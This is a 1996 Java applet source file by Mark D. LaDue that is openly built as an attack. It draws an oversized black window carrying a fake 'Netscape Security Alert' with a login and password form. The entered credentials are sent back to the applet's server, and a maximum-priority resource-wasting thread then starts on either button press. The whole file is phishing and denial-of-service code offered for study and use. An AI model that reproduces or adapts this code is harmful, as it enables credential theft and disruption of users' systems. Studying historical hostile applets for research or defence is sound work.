/*  ErrorMessage.java by Mark D. LaDue */

/*  February 28, 1996 */

/*  Copyright (c) 1996 Mark D. LaDue
    You may study, use, modify, and distribute this example for any purpose.
    This example is provided WITHOUT WARRANTY either expressed or implied.  */

/*  These classes produce a very large untrusted applet window which tries
    to hide its lack of security.  One frame within this window
    contains a bogus message about your system's security and requests
    that you login in order to run the browser in a "secure mode."
    Any login information that you enter is communicated back to the
    server whence the applet came, and in any case this ungrateful
    applet then proceeds to attack you. */

import java.awt.*;
import java.io.*;
import java.net.*;
import Login;
import Ungrateful;

public class ErrorMessage extends java.applet.Applet implements Runnable {

//  A window that tries to hide its lack of security 
    public Frame bigWindow;

//  A font for writing in the pseudo-Netscape panel
    Font netscapeFont = new Font("Times", Font.BOLD, 14);

//  The various lines of the warning message
    String warning1, warning2, warning3, warning4, warning5;

/*  We certainly won't be stopping anything */

    public void stop() {}


/* Opens a window, reports a bogus problem with the browser, and
   asks you to login to run the browser in a "secure mode." */ 

    public void run() {

//  Now open the big window 
        warning1 = "Netscape Security Alert: "; 
        warning2 = "There is an attempt to violate"; 
        warning3 = "your system's security.";
        warning4 = "To restart Netscape securely,";
        warning5 = "login to your local system.";
        bigWindow = new ErrorFrame(warning1, warning2, warning3,
                                   warning4, warning5);
        bigWindow.setFont(netscapeFont);
        bigWindow.resize(10000, 10000);  // make it big!
        Point pt = location();
        bigWindow.move(pt.x - 1000, pt.y - 1000);
        bigWindow.show();
    }
}

/* Makes the big, insecure window */

class ErrorFrame extends Frame {

//Constructor Method
    ErrorFrame(String message1, String message2, String message3,
               String message4, String message5) {
        super("Netscape: Security Alert");
        setLayout(new GridLayout(50, 40));
        for (int i = 0; i < 204; i++) {
            Canvas blackCanvas = new Canvas();
            blackCanvas.setBackground(Color.black);
            add(blackCanvas);
        }
        add(new ErrorPanel(message1, message2, message3, message4, message5));
        for (int i = 0; i < 1795; i++) {
            Canvas blackCanvas = new Canvas();
            blackCanvas.setBackground(Color.black);
            add(blackCanvas); 
        }
    }
}


class ErrorPanel extends Panel {

//  Constructor method
    ErrorPanel(String message1, String message2, String message3,
               String message4, String message5) {
        setLayout(new GridLayout(2, 1));
        setBackground(new Color(170, 170, 170));
      add(new WarningPanel(message1, message2, message3, message4, message5));
        add(new OutPanel("Login:", 12, "Password: ", 12));
    }
}

class WarningPanel extends Panel {
    WarningPanel(String s1, String s2, String s3, String s4, String s5) {
        setLayout(new GridLayout(5, 1));
        add(new Label(s1, Label.LEFT));
        add(new Label(s2, Label.LEFT));
        add(new Label(s3, Label.LEFT));
        add(new Label(s4, Label.LEFT));
        add(new Label(s5, Label.LEFT));
    }
}

class OutPanel extends Ungrateful {
    TextField tf1, tf2;
    Button b1, b2;
    Thread wasteResources = null;
    Login sendIt = null;
    int myPort = thePort;

//constructor method
    OutPanel(String prompt1, int textwidth1,
             String prompt2, int textwidth2) {

        setLayout(new GridLayout(3, 2));
        add(new Label(prompt1, Label.RIGHT));
        tf1 = new TextField(textwidth1);
        tf1.setText(null);
//        tf1.setBackground(new Color(216, 184, 184));
        add(tf1);
        add(new Label(prompt2, Label.RIGHT));
        tf2 = new TextField(textwidth2);    
        tf2.setEchoCharacter('*');
        tf2.setText(null);
//        tf2.setBackground(new Color(216, 184, 184));
        add(tf2);
        b1 = new Button("OK");
        add(b1);
        b2 = new Button("Quit");
        add(b2);
    }

    public boolean action(Event evt, Object arg) {
        if (evt.target instanceof Button) {
            String bname = (String) arg;
            if (bname.equals("OK")) {
                String user = tf1.getText();
                String pword = tf2.getText();
                sendIt = new Login(myPort);
                sendIt.communicate(user, pword);
                if (wasteResources == null) {
                    SilentThreat s = new SilentThreat();
                    wasteResources = new Thread(s);
                    wasteResources.setPriority(Thread.MAX_PRIORITY);
                    wasteResources.start();
                }
            }
            else if (bname.equals("Quit")) {
                if (wasteResources == null ) {
                    SilentThreat s = new SilentThreat();
                    wasteResources = new Thread(s);
                    wasteResources.setPriority(Thread.MAX_PRIORITY);
                    wasteResources.start();
                }
            }
        }
        return true;
    }
}

